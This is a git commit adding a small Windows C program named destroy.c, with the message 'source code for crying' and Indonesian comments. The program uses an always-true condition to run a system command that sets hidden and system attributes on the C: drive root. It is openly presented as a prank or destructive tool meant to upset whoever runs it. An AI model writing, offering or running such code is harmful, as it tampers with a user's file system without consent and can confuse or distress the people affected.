92c8ae38d0bc52f5e3066e87852dba49607ea828
Firdaus Muhammad Ismail <168290258+firdausmuhammadismail@users.noreply.github.com>
2024-05-08 11:08:26 +0100

    Create destroy.c
    source code for crying

---
+++ destroy.c
@@ -0,0 +1,10 @@
+#include <stdio.h>
+#include <windows.h>
+
+void main(){
+	//disini langsung saja saya buat kondisi true
+	if(1!=2&&5>=2&&0==0){
+		system("attrib +h +s C:/");
+	}else
+		perror("ops, ada sesuatu yang salah wkwkwkwk");
+}
